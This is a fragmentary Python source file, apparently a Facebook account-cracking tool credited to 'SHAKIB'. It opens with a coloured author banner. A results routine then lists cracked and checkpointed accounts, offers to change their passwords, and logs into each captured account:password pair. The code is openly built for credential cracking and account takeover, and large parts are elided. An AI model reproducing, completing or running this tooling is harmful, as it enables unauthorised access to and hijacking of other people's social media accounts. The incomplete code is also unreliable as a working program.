...
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m ➳𝐂.𝐄.𝐎᭄𝑆𝐻𝐴𝐾𝐼𝐵𝑈𝑅     \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mFacebook  :  \033[1;92m Shakibur          \033[1;31;1m   █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGitHub    : \033[1;92m  Shakibur-Cyber-King  \033[1;31;1m█
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :   \033[1;92m01908****66\033[1;31;1m          █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 1.5                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By SHAKIB Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}SHAKIB123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SHAKIB-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SHAKIB-CP] ", ""), titid[1])
...
class __chigoue__:
    ...
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]","\x1b[1;92m[SHAKIB]"])
